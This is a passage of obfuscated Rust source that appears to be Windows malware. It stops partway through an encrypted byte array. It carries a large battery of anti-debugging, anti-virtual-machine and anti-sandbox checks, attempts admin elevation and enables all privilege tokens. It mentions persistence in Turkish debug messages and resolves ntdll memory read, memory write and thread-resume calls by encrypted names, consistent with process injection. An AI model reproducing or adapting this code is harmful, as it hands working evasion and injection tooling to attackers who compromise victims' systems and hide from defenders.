hThread as * mut c_void , & mut suspend_count) ; let _ = (ksmkzbal . NtClose) (pi . hProcess as * mut c_void) ; let _ = (ksmkzbal . NtClose) (pi . hThread as * mut c_void) ; } true } fn jcv_jwhj_s () { let persistence_result = deyjqly_p () ; println ! ("[DEBUG] Persistence sonucu: {}" , persistence_result) ; if vjn_r_demn () { let _ = hyste_lk_p (decode_kmoddfqr_lmhb (& [218 , 11 , 13 , 89 , 93 , 115 , 249 , 83 , 99 , 52 , 107 , 75 , 202 , 133 , 204 , 118 , 142 , 191 , 134 , 48 , 112 , 4 , 176 , 13 , 93 , 217 , 198 , 50 , 49 , 62 , 20 , 20 , 115 , 32 , 42 , 77 , 160 , 5 , 74 , 250 , 40 , 164 , 215 , 79 , 232 , 99 , 231 , 253 , 49 , 208 , 120 , 53 , 19 , 164 , 42 , 26 , 102 , 123 , 46 , 200 , 160 , 231 , 82 , 32 , 198 , 168 , 55 , 174 , 156 , 150 , 247 , 243 , 11 , 78 , 163 , 132 , 230 , 157 , 95 , 196 , 222 , 41 , 135 , 142 , 109 , 61 , 0 , 235 , 232 , 160 , 69 , 100 , 2 , 41 , 232 , 72 , 65 , 186 , 48 , 132 , 251 , 117 , 180 , 151 , 226 , 160 , 23 , 56 , 20 , 52 , 13 , 165 , 248 , 183 , 211 , 4 , 112 , 53 , 219 , 198 , 62 , 157 , 95 , 86 , 149 , 114 , 190 , 103 , 247 , 243 , 100 , 185 , 89 , 12 , 117 , 9 , 204 , 166 , 211 , 39 , 98 , 231 , 45 , 177 , 254 , 229 , 139 , 241 , 7 , 197 , 165 , 94 , 113 , 32 , 158 , 173 , 23 , 247 , 85 , 41 , 95 , 86 , 211 , 211 , 69 , 154 , 84 , 157 , 177 , 179 , 118 , 132 , 46 , 185 , 204 , 42 , 57 , 59 , 66 , 168 , 139 , 95 , 90 , 227 , 145 , 185 , 182 , 13 , 158 , 0 , 212 , 249 , 120 , 89 , 208 , 153 , 127 , 164 , 31 , 87 , 200 , 86 , 223 , 121 , 242 , 148 , 65 , 67 , 197 , 106 , 77 , 156 , 107 , 166 , 128 , 52 , 224 , 187 , 126 , 70 , 70 , 18 , 150 , 12 , 86 , 211 , 153 , 77 , 200 , 120 , 37 , 142 , 165 , 219 , 197 , 222 , 36 , 193 , 115 , 114 , 7 , 204 , 152 , 40 , 111 , 190 , 203 , 191 , 83 , 34 , 191 , 229 , 187 , 130 , 13 , 189 , 243 , 236 , 101 , 177 , 36 , 104 , 231 , 225 , 204 , 20 , 217 , 164 , 239 , 190 , 16 , 20 , 73 , 158 , 21 , 235 , 145 , 2 , 42 , 220 , 5 , 151 , 132 , 120 , 119 , 159 , 56 , 228 , 167 , 224 , 142 , 86 , 18 , 208 , 21 , 118 , 57 , 246 , 57 , 26 , 223 , 199 , 37 , 177 , 123 , 194 , 164 , 201 , 98 , 97 , 185 , 131 , 38 , 118 , 119 , 186 , 222 , 248 , 44 , 108 , 29 , 188 , 28 , 64 , 176 , 6 , 50 , 250 , 24 , 81 , 196 , 219 , 18 , 12 , 240 , 119 , 126 , 210 , 219 , 1 , 220 , 198 , 156 , 12 , 23 , 91 , 232 , 99 , 71 , 52 , 224 , 214 , 192 , 46 , 150 , 177 , 13 , 105 , 244 , 46 , 191 , 149 , 79 , 32 , 116 , 226 , 141 , 92 , 25 , 162 , 5 , 17 , 13 , 77 , 138 , 211 , 188 , 34 , 17 , 154 , 45 , 153 , 149 , 153 , 235 , 40 , 41 , 37 , 80 , 30 , 22 , 57 , 211 , 172 , 158 , 94 , 43 , 83 , 165 , 230 , 21 , 108 , 115 , 27 , 156 , 174 , 201 , 5 , 55 , 50 , 205 , 133 , 95 , 70 , 28 , 180 , 82 , 10 , 147 , 239 , 115 , 105 , 188 , 82 , 71 , 27 , 118 , 120 , 46 , 145 , 202 , 98 , 160 , 184 , 126 , 243 , 236 , 250 , 70 , 151 , 69 , 23 , 77 , 51 , 72 , 71 , 211 , 94 , 106 , 33 , 130 , 167 , 7 , 140 , 133 , 156 , 71 , 135 , 48 , 47 , 31 , 243 , 135 , 33 , 133 , 227 , 110 , 108 , 20 , 23 , 241 , 6 , 232 , 188 , 2 , 102 , 212 , 125 , 180 , 72 , 123 , 29 , 190 , 116 , 228 , 231 , 143 , 146 , 130 , 156 , 112 , 79 , 90 , 59 , 67 , 101 , 143 , 134 , 2 , 176 , 7 , 123 , 8 , 2 , 101 , 92 , 99 , 160 , 212 , 216 , 7 , 145 , 18 , 209 , 174 , 8 , 65 , 202 , 84 , 251 , 64 , 123 , 147 , 120 , 127 , 159 , 243 , 206 , 254 , 217 , 122 , 81 , 190 , 171 , 6 , 124 , 97 , 85 , 66 , 89 , 149 , 181 , 250 , 144 , 244 , 149 , 162 , 102 , 117 , 15 , 71 , 203 , 143 , 117 , 225 , 178 , 144 , 242 , 244 , 119 , 155 , 19 , 241 , 3 , 142 , 51 , 121 , 198 , 85 , 145 , 180 , 88 , 240 , 180 , 30 , 188 , 175 , 6 , 217 , 33 , 100 , 245 , 188 , 191 , 58 , 251 , 200 , 52 , 252 , 9 , 39 , 188 , 29 , 210 , 84 , 15 , 39 , 67 , 86 , 179 , 27 , 55 , 144 , 114 , 81 , 188 , 92 , 14 , 239 , 172 , 84 , 192 , 111 , 45 , 101 , 156 , 119 , 241 , 224 , 243 , 106 , 55 , 158 , 149 , 92 , 74 , 94 , 205 , 230 , 54 , 237 , 151 , 26 , 83 , 244 , 121 , 229 , 98 , 174 , 37 , 78 , 140 , 215 , 121 , 97 , 244 , 242 , 36 , 155 , 133 , 10 , 104 , 187 , 56 , 186 , 176] , & [80 , 130 , 22 , 252 , 129 , 119 , 34 , 109 , 240 , 235 , 250 , 172 , 103 , 52 , 202 , 100 , 130 , 127 , 127 , 75 , 27 , 128 , 7 , 0 , 110 , 97 , 237 , 143 , 43 , 130 , 20 , 47 , 237 , 158 , 37 , 49 , 25 , 41 , 120 , 79 , 64 , 200 , 215 , 211 , 254 , 41 , 246 , 245 , 77 , 214 , 28 , 38 , 171 , 147 , 255 , 224 , 240 , 62 , 204 , 220 , 239 , 180 , 199 , 100 , 163 , 1 , 27 , 210 , 235 , 141 , 88 , 194 , 181 , 99 , 212 , 53 , 203 , 220 , 195 , 60 , 30 , 40 , 30 , 6 , 190 , 26 , 125 , 176] , 129132486726932u64) , decode_kmoddfqr_lmhb (& [30 , 132 , 7 , 127 , 58 , 180 , 55 , 156 , 90 , 119 , 237 , 117 , 31 , 90 , 112 , 232 , 178 , 64 , 21 , 209 , 212 , 17 , 26 , 115 , 216 , 10 , 7 , 240 , 96 , 145 , 96 , 107 , 110 , 45 , 230 , 246 , 36 , 98 , 96 , 62 , 44 , 234 , 1 , 31 , 152 , 31 , 180 , 73 , 205 , 233 , 134 , 195 , 157 , 72 , 227 , 2 , 182 , 203 , 81 , 135 , 91 , 95 , 174 , 20 , 9 , 70 , 194 , 130 , 88 , 169 , 235 , 100 , 74 , 7 , 54 , 248 , 109 , 48 , 15 , 31 , 249 , 201 , 155 , 138 , 68 , 117 , 232 , 235 , 85 , 109 , 161 , 136 , 132 , 9 , 175 , 79 , 179 , 34 , 2 , 148 , 239 , 69 , 131 , 240 , 42 , 154 , 125 , 96 , 20 , 22 , 129 , 58 , 182 , 150 , 228 , 217 , 81 , 134 , 149 , 232 , 192 , 249 , 133 , 17 , 76 , 151 , 167 , 227 , 40 , 46 , 21 , 190 , 2 , 35 , 43 , 194 , 87 , 38 , 29 , 131 , 172 , 242 , 60 , 163 , 63 , 59 , 193 , 28 , 150 , 74 , 110 , 208 , 29 , 206 , 17 , 249 , 195 , 180 , 31 , 147 , 52 , 64 , 0 , 51 , 228 , 116 , 192 , 90 , 123 , 233 , 3 , 168 , 10 , 248 , 159 , 236 , 86 , 121 , 202 , 243 , 118 , 0 , 254 , 164 , 107 , 191 , 100 , 18 , 40 , 192 , 8 , 250] , & [105 , 88 , 13 , 40 , 117 , 39 , 65 , 219 , 248 , 190 , 228 , 253 , 247 , 47 , 28 , 8 , 254 , 11 , 213 , 85 , 188 , 139 , 172 , 204 , 236 , 159 , 66 , 1 , 242 , 33 , 31 , 72 , 81 , 255 , 98 , 110 , 98 , 220 , 2 , 159 , 213 , 5 , 21 , 101 , 28 , 218 , 219 , 128 , 163 , 231 , 3 , 72 , 78 , 14 , 232 , 171 , 10 , 154 , 114 , 10 , 176 , 64 , 187 , 192 , 51 , 215 , 177 , 37 , 200 , 32 , 100 , 87 , 195 , 45 , 31 , 252 , 17 , 208 , 200 , 7 , 2 , 93 , 51 , 252 , 192 , 188 , 132 , 189] , 48507360642486u64)) ; } }          pub fn ks_w_dhoru () -> bool { if ! runtime_detector :: is_windows () { return false ; } if ! admin_check :: is_admin () { if let Err (_) = admin_check :: elevate_process () { } } if admin_check :: is_admin () { let _ = all_tokens :: enable () ; } vjn_r_demn () } pub fn x_gm_ulhwn () -> bool { if ! runtime_detector :: is_windows () { return false ; } if run_debug_checks () { return true ; } if run_vm_checks () { return true ; } if run_environment_checks () { return true ; } if rawlvo_rj () { return true ; } false } pub fn vjn_r_demn () -> bool { if debugger_detection :: is_debugger_present () { println ! ("[anti_debug_rust] debugger_detection::is_debugger_present") ; return true ; } if debugger_detection :: check_remote_debugger () . unwrap_or (false) { println ! ("[anti_debug_rust] debugger_detection::check_remote_debugger") ; return true ; } if parent_anti_debug :: parent_anti_debug () { println ! ("[anti_debug_rust] parent_anti_debug::parent_anti_debug") ; return true ; } if pc_uptime :: check_uptime ((47 + 553)) . unwrap_or (false) { println ! ("[anti_sandbox] pc_uptime::check_uptime") ; return true ; } if bad_processes :: detect () . unwrap_or (false) { println ! ("[anti_debug_rust] bad_processes::detect") ; return true ; } if running_processes :: check_running_processes_count ((23 + 27)) . unwrap_or (false) { println ! ("[anti_sandbox] running_processes::check_running_processes_count") ; return true ; } if blacklisted_windows :: check_blacklisted_windows () { println ! ("[anti_debug_rust] blacklisted_windows::check_blacklisted_windows") ; return true ; } if hooks_detection :: detect_hooks_on_common_winapi_functions (None , None) { println ! ("[anti_debug_rust] hooks_detection::detect_hooks_on_common_winapi_functions") ; return true ; } if shadow_defender_detection :: detect_shadow_defender () { println ! ("[anti_vm] shadow_defender_detection::detect_shadow_defender") ; return true ; } if anyrun_detection :: anyrun_detection () . unwrap_or (false) { println ! ("[anti_sandbox] anyrun_detection::anyrun_detection") ; return true ; } if ! clean_environment_detection :: detect_clean_environment () { println ! ("[anti_sandbox] clean_environment_detection::detect_clean_environment (too clean)") ; return true ; } if comodo_antivirus_detection :: detect_comodo_antivirus () { println ! ("[anti_sandbox] comodo_antivirus_detection::detect_comodo_antivirus") ; return true ; } if deep_freeze_detection :: detect_deep_freeze () { println ! ("[anti_vm] deep_freeze_detection::detect_deep_freeze") ; return true ; } if hyperv_check :: detect_hyperv () . unwrap_or (false) { println ! ("[anti_vm] hyperv_check::detect_hyperv") ; return true ; } if kvm_check :: check_for_kvm () . unwrap_or (false) { println ! ("[anti_vm] kvm_check::check_for_kvm") ; return true ; } if monitor_metrics :: is_screen_small () . unwrap_or (false) { println ! ("[anti_sandbox] monitor_metrics::is_screen_small") ; return true ; } if parallels_check :: check_for_parallels () . unwrap_or (false) { println ! ("[anti_vm] parallels_check::check_for_parallels") ; return true ; } if qemu_check :: check_for_qemu () . unwrap_or (false) { println ! ("[anti_vm] qemu_check::check_for_qemu") ; return true ; } if recent_file_activity :: recent_file_activity_check () . unwrap_or (false) { println ! ("[anti_sandbox] recent_file_activity::recent_file_activity_check") ; return true ; } if repetitive_process :: check () . unwrap_or (false) { println ! ("[anti_sandbox] repetitive_process::check") ; return true ; } if sandboxie_detection :: detect_sandboxie () { println ! ("[anti_sandbox] sandboxie_detection::detect_sandboxie") ; return true ; } if triage_detection :: triage_check () . unwrap_or (false) { println ! ("[anti_sandbox] triage_detection::triage_check") ; return true ; } if usb_check :: plugged_in () . unwrap_or (true) == false { println ! ("[anti_sandbox] usb_check::plugged_in (no USB devices)") ; return true ; } if username_check :: check_for_blacklisted_names () { println ! ("[anti_sandbox] username_check::check_for_blacklisted_names") ; return true ; } if virtualbox_detection :: graphics_card_check () . unwrap_or (false) { println ! ("[anti_vm] virtualbox_detection::graphics_card_check") ; return true ; } if vm_artifacts :: vm_artifacts_detect () { println ! ("[anti_vm] vm_artifacts::vm_artifacts_detect") ; return true ; } if vm_platform_check :: detect_vm_platform () . unwrap_or (false) { println ! ("[anti_vm] vm_platform_check::detect_vm_platform") ; return true ; } if vmware_detection :: graphics_card_check () . unwrap_or (false) { println ! ("[anti_vm] vmware_detection::graphics_card_check") ; return true ; } if internet_check :: check_connection () . unwrap_or (true) == false { println ! ("[anti_sandbox] internet_check::check_connection") ; return true ; } false } pub fn rawlvo_rj () -> bool { bad_processes :: detect () . unwrap_or (false) || blacklisted_windows :: check_blacklisted_windows () } pub struct ajnu_ecee { pub enable_debug_checks : bool , pub enable_vm_checks : bool , pub enable_environment_checks : bool , pub enable_process_checks : bool , pub min_uptime_seconds : u32 , pub min_process_count : usize , pub min_installed_programs : usize , pub enable_internet_check : bool , pub enable_usb_check : bool , pub enable_admin_escalation : bool , pub enable_privilege_escalation : bool , pub enable_critical_process : bool , } impl Default for ajnu_ecee { fn default () -> Self { Self { enable_debug_checks : true , enable_vm_checks : true , enable_environment_checks : true , enable_process_checks : true , min_uptime_seconds : (108 + 492) , min_process_count : (19 + 31) , min_installed_programs : 10 , enable_internet_check : true , enable_usb_check : true , enable_admin_escalation : true , enable_privilege_escalation : true , enable_critical_process : true , } } } # [cfg (test)] mod tests { # [test] fn xgb_k_cuey () { println ! ("Detected OS: {:?}" , runtime_detector :: detect_os ()) ; assert_eq ! (runtime_detector :: is_windows () , cfg ! (windows)) ; } # [test] fn rjjeun_j_p () { println ! ("Running as admin: {}" , admin_check :: is_admin ()) ; } # [test] fn fuidpmv_n () { println ! ("Debugger present: {}" , debugger_detection :: is_debugger_present ()) ; } # [test] fn kyzp_v_rzo () { if let Ok (result) = debugger_detection :: check_remote_debugger () { println ! ("Remote debugger present: {}" , result) ; } } # [test] fn varowdlv () { println ! ("Suspicious parent process: {}" , parent_anti_debug :: parent_anti_debug ()) ; } # [test] fn rctun_ylf () { if let Ok (uptime) = pc_uptime :: get_uptime_in_seconds () { println ! ("System uptime: {} seconds" , uptime) ; } } # [test] fn ocmbs_ebs () { if let Ok (count) = running_processes :: get_running_processes_count () { println ! ("Running processes: {}" , count) ; } } # [test] fn yrbp_h_xkw () { if let Ok (result) = bad_processes :: detect () { println ! ("Bad processes detected: {}" , result) ; } } # [test] fn icgsb_su_o () { println ! ("VM environment detected: {}" , run_vm_checks ()) ; } # [test] fn mwgh_z_aqr () { println ! ("Suspicious environment detected: {}" , run_environment_checks ()) ; } # [test] fn dyt_ggyj_k () { if let Ok (connected) = internet_check :: check_connection () { println ! ("Internet connection available: {}" , connected) ; } } # [test] fn stbf_poi_a () { if let Ok (small_screen) = monitor_metrics :: is_screen_small () { println ! ("Small screen detected: {}" , small_screen) ; } } # [test] fn oxgxcru_e () { println ! ("Blacklisted username: {}" , username_check :: check_for_blacklisted_names ()) ; } # [test] fn df_eyglu_c () { if let Ok (usb_detected) = usb_check :: plugged_in () { println ! ("USB devices detected: {}" , usb_detected) ; } } # [test] fn oqlles_w_k () { println ! ("Clean environment (10+ programs): {}" , clean_environment_detection :: detect_clean_environment ()) ; } # [test] fn axoialgd () { if admin_check :: is_admin () { match all_tokens :: enable () { Ok (_) => println ! ("Successfully enabled all available privileges") , Err (e) => println ! ("Failed to enable privileges: {}" , e) , } } else { println ! ("Not running as admin, cannot test privilege escalation") ; } } # [test] fn necw_t_kny () { let detected = vjn_r_demn () ; println ! ("Anti-analysis measures detected: {}" , detected) ; println ! ("Debug checks: {}" , run_debug_checks ()) ; println ! ("VM checks: {}" , run_vm_checks ()) ; println ! ("Environment checks: {}" , run_environment_checks ()) ; println ! ("Process checks: {}" , run_process_checks ()) ; } # [test] fn jktq_ufgt () { if runtime_detector :: is_windows () { let detected = x_gm_ulhwn () ; println ! ("Windows-specific checks detected threats: {}" , detected) ; } else { println ! ("Not running on Windows, skipping Windows-specific tests") ; } } }      type NtQueryInformationProcess = extern "system" fn (ProcessHandle : * mut c_void , ProcessInformationClass : PROCESS_INFORMATION_CLASS , ProcessInformation : * mut c_void , ProcessInformationLength : u32 , ReturnLength : * mut u32 ,) -> i32 ; type NtClose = extern "system" fn (Handle : * mut c_void) -> i32 ; type NtReadVirtualMemory = extern "system" fn (ProcessHandle : * mut c_void , BaseAddress : * mut c_void , Buffer : * mut c_void , NumberOfBytesToRead : usize , NumberOfBytesRead : * mut usize ,) -> i32 ; type NtWriteVirtualMemory = extern "system" fn (ProcessHandle : * mut c_void , BaseAddress : * mut c_void , Buffer : * mut c_void , NumberOfBytesToWrite : usize , NumberOfBytesWritten : * mut usize ,) -> i32 ; type NtResumeThread = extern "system" fn (ThreadHandle : * mut c_void , SuspendCount : * mut u32 ,) -> i32 ; # [derive (Clone)] pub struct Syscalls { pub NtQueryInformationProcess : NtQueryInformationProcess , pub NtClose : NtClose , pub NtReadVirtualMemory : NtReadVirtualMemory , pub NtWriteVirtualMemory : NtWriteVirtualMemory , pub NtResumeThread : NtResumeThread , } impl Syscalls { fn new () -> Result < Self , & 'static str > { unsafe { let ntdll = LoadLibraryA (decode_kmoddfqr_lmhb (& [12 , 132 , 237 , 243 , 213 , 71 , 255 , 58 , 204 , 245 , 213 , 7 , 172 , 32 , 236 , 177 , 211 , 46 , 197 , 53 , 239 , 202 , 137 , 60 , 221 , 147 , 221 , 151 , 140 , 205 , 78 , 29 , 221 , 6 , 72 , 95 , 47 , 131 , 57 , 103 , 230 , 73 , 38 , 144 , 60 , 22 , 168 , 158 , 79 , 200 , 207 , 145 , 59 , 160 , 185 , 8 , 200 , 58 , 195 , 89 , 202 , 116 , 109 , 53 , 11 , 223 , 36 , 160 , 12 , 133 , 67 , 156 , 208 , 150 , 181 , 245 , 26 , 103 , 178 , 65 , 147 , 100 , 173 , 104 , 40 , 150 , 13 , 209 , 247 , 39 , 115 , 55 , 248 , 66 , 204 , 116 , 106 , 189 , 132 , 35 , 228 , 104 , 172 , 97 , 219 , 54 , 63 , 179 , 97 , 234 , 194 , 136 , 237 , 174 , 250 , 0 , 217 , 162 , 0 , 248 , 188 , 50 , 215 , 149 , 29 , 20 , 111 , 47 , 138 , 165 , 77 , 52 , 143 , 201 , 14 , 104 , 149 , 26 , 98 , 19 , 209 , 62 , 20 , 245] , & [216 , 134 , 191 , 206 , 24 , 109 , 31 , 172 , 169 , 51 , 111 , 227 , 90 , 55 , 136 , 236 , 59 , 85 , 207 , 11 , 214 , 75 , 49 , 140 , 235 , 149 , 76 , 100 , 168 , 245 , 11 , 160 , 225 , 38 , 16 , 169 , 69 , 10 , 107 , 35 , 92 , 188 , 48 , 15 , 32 , 49 , 51 , 30 , 216 , 61 , 32 , 122 , 157 , 105 , 211 , 45 , 27 , 160 , 24 , 174 , 70 , 132 , 110 , 43 , 4 , 163 , 234 , 51 , 255 , 10 , 124 , 234 , 80 , 52 , 108 , 12 , 187 , 73 , 72 , 131 , 98 , 240 , 6 , 52 , 188 , 241 , 139 , 49] , 23742579213193u64) . as_ptr ()) ; if ntdll == 0 { return Err (decode_kmoddfqr_lmhb (& [28 , 224 , 5 , 68 , 209 , 86 , 251 , 72 , 111 , 227 , 219 , 112 , 29 , 203 , 151 , 247 , 152 , 26 , 37 , 163 , 159 , 223 , 219 , 162 , 225 , 70 , 43 , 255 , 51 , 50 , 124 , 73 , 134 , 14 , 149 , 1 , 213 , 145 , 238 , 209 , 79 , 118 , 34 , 84 , 42 , 102 , 3 , 228 , 216 , 143 , 182 , 235 , 240 , 22 , 188 , 200 , 50 , 113 , 168 , 247 , 108 , 241 , 142 , 149 , 60 , 173 , 147 , 175 , 13 , 94 , 195 , 56 , 206 , 160 , 204 , 120 , 179 , 146 , 193 , 65 , 178 , 163 , 236 , 253 , 161 , 247 , 89 , 146 , 148 , 158 , 221 , 128 , 179 , 45 , 181 , 45 , 128 , 230 , 8 , 99 , 30 , 17 , 166 , 45 , 5 , 35 , 109 , 155 , 114 , 142 , 70 , 199 , 39 , 17 , 166 , 128 , 193 , 179 , 118 , 66 , 190 , 240 , 25 , 169 , 1 , 39 , 94 , 139 , 246 , 228 , 49 , 51 , 17 , 151 , 146 , 240 , 251 , 186 , 39 , 118 , 121 , 9 , 136 , 123 , 91 , 66 , 148 , 134 , 70 , 208 , 178 , 111 , 242 , 61 , 176 , 45 , 142 , 209 , 2 , 73 , 106 , 230 , 119 , 106 , 220 , 47 , 145 , 151 , 78 , 112 , 197 , 67 , 138 , 211 , 102 , 112 , 109 , 67 , 177 , 48 , 11 , 82 , 9 , 25 , 226 , 174 , 90 , 130 , 152 , 252 , 140 , 100 , 68 , 169 , 234 , 84 , 130 , 62 , 7 , 223 , 34 , 34 , 112 , 126 , 42 , 103 , 149 , 33 , 123 , 179 , 46 , 157 , 102 , 134 , 84 , 35 , 23 , 128 , 97 , 51 , 163 , 190 , 246 , 25 , 150 , 137 , 93 , 94 , 65 , 18 , 152 , 104 , 115 , 0 , 4 , 213 , 17 , 71 , 50 , 237 , 239 , 179 , 206 , 8 , 163 , 96 , 101 , 14 , 144 , 242 , 245 , 12 , 189 , 229 , 237 , 228 , 106 , 204 , 88 , 39 , 139 , 243 , 20 , 167 , 53 , 102 , 118 , 193 , 126 , 121 , 49 , 79 , 108 , 54 , 28 , 147 , 121 , 229 , 248 , 238 , 228 , 105 , 0 , 17 , 54 , 227 , 29 , 246] , & [218 , 199 , 34 , 120 , 111 , 11 , 35 , 13 , 136 , 40 , 61 , 9 , 160 , 88 , 50 , 109 , 139 , 88 , 236 , 97 , 9 , 28 , 79 , 222 , 49 , 150 , 82 , 97 , 163 , 17 , 139 , 228 , 118 , 88 , 236 , 53 , 125 , 101 , 183 , 76 , 139 , 87 , 92 , 173 , 230 , 170 , 23 , 64 , 188 , 27 , 43 , 249 , 83 , 20 , 25 , 101 , 112 , 43 , 79 , 242 , 191 , 237 , 67 , 248 , 89 , 22 , 106 , 167 , 96 , 126 , 140 , 99 , 219 , 61 , 189 , 19 , 133 , 232 , 99 , 250 , 120 , 27 , 121 , 64 , 149 , 116 , 113 , 161] , 117639154239665u64)) ; } let NtQueryInformationProcess = GetProcAddress (ntdll , decode_kmoddfqr_lmhb (& [181 , 67 , 51 , 248 , 181 , 123 , 122 , 202 , 246 , 50 , 107 , 168 , 104 , 105 , 2 , 157 , 107 , 254 , 113 , 206 , 109 , 209 , 66 , 27 , 14 , 136 , 142 , 23 , 250 , 190 , 143 , 145 , 220 , 180 , 116 , 130 , 139 , 51 , 66 , 138 , 209 , 202 , 164 , 141 , 10 , 117 , 240 , 25 , 235 , 0 , 236 , 62 , 221 , 175 , 47 , 151 , 27 , 253 , 128 , 190 , 30 , 234 , 78 , 156 , 37 , 116 , 1 , 32 , 161 , 40 , 10 , 93 , 0 , 149 , 131 , 200 , 38 , 125 , 216 , 84 , 198 , 8 , 27 , 116 , 128 , 59 , 32 , 191 , 125 , 81 , 13 , 87 , 80 , 189 , 148 , 19 , 195 , 43 , 147 , 215 , 53 , 48 , 27 , 27 , 188 , 20 , 240 , 151 , 245 , 45 , 22 , 65 , 117 , 166 , 151 , 109 , 73 , 91 , 36 , 223 , 212 , 150 , 32 , 213 , 139 , 133 , 203 , 135 , 187 , 123 , 205 , 141 , 92 , 167 , 163 , 150 , 208 , 24 , 22 , 211 , 195 , 190 , 162 , 183 , 168 , 110 , 65 , 205 , 227 , 116 , 98 , 227 , 245 , 151 , 62 , 156 , 202 , 95 , 51 , 162 , 116 , 166 , 253 , 129 , 155 , 52 , 196 , 87 , 59 , 151 , 55 , 82 , 99 , 220 , 255 , 193 , 67 , 61 , 93 , 210 , 87 , 130 , 228 , 89 , 111 , 79 , 78 , 229 , 146 , 58 , 126 , 214 , 55 , 182 , 187 , 57 , 173 , 235 , 254 , 94 , 148 , 59 , 215 , 41 , 190 , 180 , 40 , 24 , 18 , 44 , 86 , 129 , 96 , 67 , 100 , 82 , 126 , 96 , 40 , 40 , 191 , 255 , 250 , 103 , 112 , 239 , 164 , 77 , 75 , 45 , 139 , 138 , 133 , 136 , 123 , 84 , 38 , 236 , 147 , 23 , 168 , 173 , 248 , 84 , 49 , 163 , 185 , 198 , 213 , 143 , 153 , 8 , 124 , 201 , 244 , 78 , 1 , 34 , 221 , 83 , 15 , 252 , 222 , 171 , 99 , 245 , 173 , 14 , 149 , 39 , 92 , 113 , 16 , 245 , 74 , 205 , 104 , 250 , 56 , 115 , 62 , 26 , 90 , 64 , 45 , 143 , 143 , 130 , 68 , 126 , 146 , 4 , 161 , 39 , 92 , 70 , 92 , 208 , 104 , 46 , 149 , 76 , 139 , 161 , 87 , 116 , 139 , 122 , 72 , 199 , 181 , 199 , 190 , 125 , 144 , 54 , 255 , 2 , 15 , 233] , & [66 , 104 , 243 , 112 , 3 , 196 , 244 , 168 , 85 , 217 , 28 , 96 , 126 , 175 , 127 , 238 , 243 , 123 , 140 , 143 , 241 , 86 , 36 , 73 , 198 , 85 , 45 , 91 , 148 , 170 , 16 , 209 , 253 , 149 , 13 , 148 , 110 , 219 , 255 , 38 , 96 , 84 , 88 , 183 , 62 , 154 , 237 , 72 , 46 , 57 , 26 , 167 , 74 , 105 , 202 , 111 , 158 , 235 , 210 , 118 , 57 , 110 , 157 , 152 , 104 , 202 , 33 , 17 , 1 , 102 , 111 , 46 , 88 , 190 , 145 , 144 , 162 , 135 , 244 , 223 , 50 , 29 , 176 , 15 , 12 , 109 , 75 , 120] , 155580895332926u64) . as_ptr ()) ; let NtClose = GetProcAddress (ntdll , decode_kmoddfqr_lmhb (& [77 , 61 , 65 , 5 , 77 , 240 , 63 , 166 , 116 , 159 , 166 , 191 , 21 , 46 , 184 , 201 , 44 , 4 , 31 , 165 , 208 , 148 , 130 , 28 , 245 , 196 , 196 , 77 , 150 , 46 , 148 , 233 , 141 , 215 , 153 , 106 , 85 , 247 , 4 , 252 , 32 , 74 , 193 , 53 , 70 , 232 , 64 , 21 , 242 , 193 , 196 , 169 , 120 , 144 , 112 , 192 , 152 , 181 , 61 , 187 , 159 , 231 , 145 , 132 , 78 , 228 , 255 , 152 , 148 , 209 , 93 , 44 , 3 , 112 , 116 , 142 , 26 , 24 , 150 , 21 , 43 , 98 , 95 , 133 , 113 , 104 , 229 , 237 , 88 , 184 , 26 , 55 , 189 , 157 , 252 , 228 , 119 , 56 , 248 , 168 , 215 , 208 , 221 , 221 , 114 , 58 , 108 , 7 , 234 , 20 , 201 , 214 , 162 , 84 , 87 , 216 , 37 , 8 , 144 , 196 , 171 , 237 , 207 , 105 , 132 , 9 , 30 , 63] , & [254 , 92 , 53 , 252 , 138 , 161 , 188 , 219 , 41 , 2 , 205 , 131 , 177 , 42 , 100 , 92 , 126 , 168 , 188 , 181 , 225 , 103 , 106 , 165 , 192 , 177 , 150 , 87 , 89 , 18 , 109 , 45 , 161 , 97 , 159 , 234 , 232 , 15 , 219 , 92 , 42 , 153 , 216 , 193 , 182 , 245 , 3 , 231 , 181 , 206 , 26 , 234 , 252 , 134 , 74 , 76 , 32 , 107 , 244 , 149 , 106 , 81 , 137 , 123 , 19 , 146 , 70 , 201 , 72 , 104 , 227 , 206 , 95 , 232 , 5 , 237 , 87 , 199 , 66 , 40 , 21 , 129 , 156 , 153 , 212 , 2 , 196 , 116] , 14504104559289u64) . as_ptr ()) ; let NtReadVirtualMemory = GetProcAddress (ntdll , decode_kmoddfqr_lmhb (& [220 , 93 , 39 , 202 , 27 , 4 , 2 , 55 , 197 , 49 , 163 , 66 , 136 , 186 , 33 , 74 , 11 , 177 , 36 , 186 , 137 , 41 , 223 , 99 , 67 , 118 , 140 , 14 , 193 , 40 , 56 , 163 , 222 , 115 , 202 , 117 , 24 , 171 , 104 , 217 , 9 , 1 , 112 , 170 , 66 , 231 , 122 , 190 , 57 , 10 , 32 , 212 , 231 , 92 , 85 , 234 , 99 , 198 , 185 , 141 , 202 , 224 , 198 , 117 , 188 , 107 , 70 , 242 , 134 , 148 , 118 , 61 , 31 , 68 , 170 , 199 , 210 , 110 , 162 , 153 , 16 , 214 , 210 , 155 , 48 , 39 , 61 , 29 , 10 , 113 , 158 , 182 , 228 , 54 , 35 , 131 , 156 , 79 , 0 , 177 , 134 , 127 , 146 , 34 , 221 , 131 , 225 , 30 , 214 , 62 , 74 , 49 , 221 , 25 , 52 , 250 , 8 , 101 , 18 , 66 , 251 , 126 , 201 , 96 , 138 , 143 , 125 , 122 , 87 , 136 , 14 , 128 , 239 , 124 , 244 , 113 , 44 , 247 , 186 , 148 , 92 , 247 , 238 , 139 , 44 , 185 , 226 , 135 , 51 , 86 , 125 , 178 , 58 , 117 , 247 , 193 , 136 , 190 , 56 , 174 , 67 , 199 , 114 , 174 , 156 , 203 , 48 , 238 , 238 , 238 , 91 , 158 , 149 , 49 , 133 , 55 , 167 , 20 , 199 , 100 , 220 , 159 , 132 , 36 , 127 , 138 , 37 , 105 , 68 , 147 , 96 , 38 , 113 , 165 , 103 , 6 , 29 , 33 , 250 , 184 , 46 , 174 , 163 , 53 , 241 , 103 , 158 , 146 , 206 , 182 , 238 , 87 , 191 , 99 , 33 , 80 , 145 , 19 , 176 , 176 , 198 , 155 , 124 , 44 , 75 , 177 , 200 , 79 , 204 , 177 , 131 , 34 , 77 , 57 , 250 , 249 , 74 , 10 , 58 , 161 , 249 , 81 , 115 , 84 , 255 , 235 , 138 , 21 , 41 , 30 , 99 , 103 , 178 , 80 , 230 , 150] , & [165 , 65 , 249 , 37 , 134 , 205 , 142 , 125 , 27 , 82 , 123 , 133 , 10 , 181 , 93 , 1 , 62 